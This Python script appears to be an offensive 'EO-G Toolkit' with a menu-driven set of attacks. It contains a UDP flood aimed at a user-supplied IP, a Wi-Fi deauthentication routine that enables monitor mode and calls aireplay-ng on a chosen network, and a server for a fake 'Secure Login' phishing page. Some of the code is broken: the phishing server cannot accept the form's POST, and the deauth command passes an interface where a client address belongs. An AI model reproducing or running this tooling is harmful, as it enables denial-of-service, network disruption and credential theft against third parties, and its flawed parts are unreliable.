import os
import socket
import random
import subprocess
from http.server import SimpleHTTPRequestHandler, HTTPServer
import requests
import time


# Display Banner
def display_banner():
    banner = """
    ███████╗ ██████╗ ██████╗ ███████╗
    ██╔════╝██╔════╝██╔═══██╗██╔════╝
    █████╗  ██║     ██║   ██║███████╗
    ██╔══╝  ██║     ██║   ██║╚════██║
    ███████╗╚██████╗╚██████╔╝███████║
    ╚══════╝ ╚═════╝ ╚═════╝ ╚══════╝
    EO-G Toolkit with Real-Time Features
    """
    print(banner)


try:
    display_banner()
except Exception as e:
    print(f"Error displaying banner: {e}")


# EO-G Real System
class EOGReal:
    def __init__(self):
        self.target = None

    def recon_target(self, target_ip):
        """
        Perform reconnaissance by pinging the target.
        """
        print(f"Reconnaissance initiated on target: {target_ip}")
        try:
            response = subprocess.run(["ping", "-c", "1", target_ip], capture_output=True, text=True)
            if "1 packets transmitted, 1 received" in response.stdout:
                print(f"Target {target_ip} is active.")
                self.target = target_ip
            else:
                print(f"Target {target_ip} is not responding.")
        except Exception as e:
            print(f"Recon error: {e}")

    def wifi_attack(self):
        """
        Perform a Wi-Fi deauthentication attack.
        """
        print("Starting Wi-Fi attack...")
        try:
            # Detect Wi-Fi interface
            print("Detecting wireless interfaces...")
            result = subprocess.run(["iwconfig"], stdout=subprocess.PIPE, text=True)
            interfaces = [line.split()[0] for line in result.stdout.splitlines() if "IEEE 802.11" in line]

            if not interfaces:
                print("No wireless interfaces found! Ensure your wireless card supports monitor mode.")
                return

            print("\nAvailable Wireless Interfaces:")
            for idx, iface in enumerate(interfaces, start=1):
                print(f"{idx}. {iface}")
            
            iface_choice = int(input("Select your wireless interface (by number): "))
            iface = interfaces[iface_choice - 1]

            # Enable monitor mode
            print(f"Enabling monitor mode on {iface}...")
            subprocess.run(["ifconfig", iface, "down"])
            subprocess.run(["iwconfig", iface, "mode", "monitor"])
            subprocess.run(["ifconfig", iface, "up"])
            print(f"Monitor mode enabled on {iface}.")

            # Scan for Wi-Fi networks
            print("Scanning for Wi-Fi networks...")
            scan_result = subprocess.run(["iwlist", iface, "scan"], stdout=subprocess.PIPE, text=True)
            networks = [
                line.strip()
                for line in scan_result.stdout.splitlines()
                if "ESSID:" in line
            ]
            if not networks:
                print("No networks found! Make sure your wireless card is within range.")
                return

            print("\nAvailable Networks:")
            for idx, net in enumerate(networks, start=1):
                ssid = net.split("ESSID:")[1].strip().replace('"', '')
                print(f"{idx}. {ssid}")
            
            net_choice = int(input("Select a network to attack (by number): "))
            target_ssid = networks[net_choice - 1].split("ESSID:")[1].strip().replace('"', '')

            # Use aireplay-ng for deauthentication attack
            print(f"Performing deauthentication attack on {target_ssid}...")
            subprocess.run(["aireplay-ng", "--deauth", "0", "-e", target_ssid, "-c", iface])

        except Exception as e:
            print(f"Error during Wi-Fi attack: {e}")

    def ddos_attack(self, target_ip, duration=10):
        """
        Perform a UDP flood attack.
        """
        print(f"Starting DDoS attack on {target_ip} for {duration} seconds...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        end_time = time.time() + duration

        while time.time() < end_time:
            try:
                sock.sendto(payload, (target_ip, 80))
            except Exception as e:
                print(f"Error during DDoS attack: {e}")
        print("DDoS attack completed.")

    def phishing_page(self, port=8080):
        """
        Set up a phishing server.
        """
        print(f"Starting phishing server on port {port}")
        phishing_html = """
        <html>
        <body>
            <h1>Secure Login</h1>
            <form method="POST" action="/submit">
                <input type="text" name="username" placeholder="Username"><br>
                <input type="password" name="password" placeholder="Password"><br>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
        """
        with open("index.html", "w") as f:
            f.write(phishing_html)

        os.chdir(os.path.dirname(os.path.abspath("index.html")))
        try:
            server = HTTPServer(("0.0.0.0", port), SimpleHTTPRequestHandler)
            print(f"Phishing server running at http://0.0.0.0:{port}. Press Ctrl+C to stop.")
            server.serve_forever()
        except KeyboardInterrupt:
            print("\nPhishing server stopped.")
            server.server_close()


# EO-G Control Panel
def eog_control():
    agent = EOGReal()
    while True:
        print("\nEO-G Options:")
        print("1. Recon Target")
        print("2. DDoS Attack")
        print("3. Phishing Server")
        print("4. Wi-Fi Attack")
        print("5. Exit")
        choice = input("Choose an option: ")

        if choice == "1":
            target = input("Enter the target IP: ")
            agent.recon_target(target)
        elif choice == "2":
            target = input("Enter the target IP: ")
            duration = int(input("Enter the attack duration (seconds): "))
            agent.ddos_attack(target, duration)
        elif choice == "3":
            port = int(input("Enter the port for the phishing server: "))
            agent.phishing_page(port)
        elif choice == "4":
            agent.wifi_attack()
        elif choice == "5":
            print("Exiting EO-G Toolkit.")
            break
        else:
            print("Invalid choice. Please try again.")


# Run EO-G Control
if __name__ == "__main__":
    eog_control()
